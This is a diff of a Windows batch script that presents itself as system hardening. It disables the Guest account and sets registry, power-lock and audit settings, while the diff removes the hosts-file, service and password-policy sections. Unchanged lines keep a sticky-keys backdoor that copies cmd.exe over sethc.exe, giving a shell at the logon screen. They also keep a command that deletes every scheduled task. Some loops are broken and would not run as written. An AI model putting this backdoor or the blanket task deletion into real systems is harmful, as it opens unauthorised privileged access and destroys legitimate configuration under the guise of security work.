@@ -23,57 +23,13 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-T
 REM Windows auomatic updates
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" /v AUOptions /t REG_DWORD /d 3 /f
 
-
-echo Cleaning out the DNS cache...
-ipconfig /flushdns
-echo Writing over the hosts file...
-attrib -r -s C:\WINDOWS\system32\drivers\etc\hosts
-echo > C:\Windows\System32\drivers\etc\hosts
-if %errorlevel%==1 echo There was an error in writing to the hosts file (not running this as Admin probably)
-REM Services
-echo Showing you the services...
-net start
-echo Now writing services to a file and searching for vulnerable services...
-net start > servicesstarted.txt
-echo This is only common services, not nessecarily going to catch 100%
-REM looks to see if remote registry is on
-net start | findstr Remote Registry
-if %errorlevel%==0 (
-	echo Remote Registry is running!
-	echo Attempting to stop...
-	net stop RemoteRegistry
-	sc config RemoteRegistry start=disabled
-	if %errorlevel%==1 echo Stop failed... sorry...
-) else ( 
-	echo Remote Registry is already indicating stopped.
-)
-REM Remove all saved credentials
-REM looks to see if remote access is on
-set SRVC_LIST=(RemoteAccess Telephony tlntsvr p2pimsvc simptcp fax msftpsvc)
-	for %%i in %HITHERE% do net stop %%i
-	for %%i in %HITHERE% sc config %%i start= disabled
-REM Rouge User Portion deleted.... disabling code because it's lame as hell....
-REM net users 
-REM echo Would you like to delete a username?
-REM set /p ynuser=Y or N? 
-REM if %ynuser%==Y (
-REM	set /p deluser=Enter a user to delete: 
-REM	if %deluser%=="CYBERNEXS" echo DO NOT DELETE CYBERNEXS. IT WILL DISCONNNECT TO SAIC.
-REM	if %deluser%=="CYBERNEXS" goto :deletion
-REM	net user %deluser% /delete
-REM	if %errorlevel%==0 echo Deletion succcessful.
-REM	goto :deletion
-REM ) else (
-REM echo K. Moving on.
-REM )
-
 REM Guest Account is deactivating
 net user Guest | findstr Active | findstr Yes
 if %errorlevel%==0 echo Guest account is active, deactivating
 if %errorlevel%==1 echo Guest account is not active, checking default admin account
 net user Guest /active:NO
 REM Rename Guest Account
-wmic useraccount where name='Guest' rename baconsweggur
+wmic useraccount where name='Guest' rename iamnotaguest
 REM Make sure you are not on the administrator account before you deactive administrator account
 echo Making sure you are not on the default admin account...
 net user | findstr Administrator
@@ -97,7 +53,6 @@ net users > userlist.txt
 )
 REM now on to the power settings
 REM use commands as vague as possible to set a require password on wakeup
-REM assumes its a laptop, which is silly
 powercfg -SETDCVALUEINDEX SCHEME_BALANCED SUB_NONE CONSOLELOCK 1
 powercfg -SETACVALUEINDEX SCHEME_BALANCED SUB_NONE CONSOLELOCK 1
 powercfg -SETDCVALUEINDEX SCHEME_MIN SUB_NONE CONSOLELOCK 1
@@ -210,17 +165,6 @@ reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v Wa
 reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v WarnOnPostRedirect /t REG_DWORD /d 1 /f
 reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v WarnonZoneCrossing /t REG_DWORD /d 1 /f
 
-REM account password policy set
-echo New requirements are being set for your passwords
-net accounts /FORCELOGOFF:30 /MINPWLEN:8 /MAXPWAGE:30 /MINPWAGE:10 /UNIQUEPW:3
-echo New password policy:
-echo Force log off after 30 minutes
-echo Minimum password length of 8 characters
-echo Maximum password age of 30
-echo Minimum password age of 10
-echo Unique password threshold set to 3 (default is 5)
-pause
-REM Delete system tasks
 schtasks /Delete /TN *
 
 REM Integrated Stick Keys
@@ -235,7 +179,6 @@ copy cmd.exe sethc.exe
 echo Stick Keys exploit triggered
 
 REM Saved Credentials
-
 
 REM Auditing Policy
 auditpol /set /category:* /success:enable
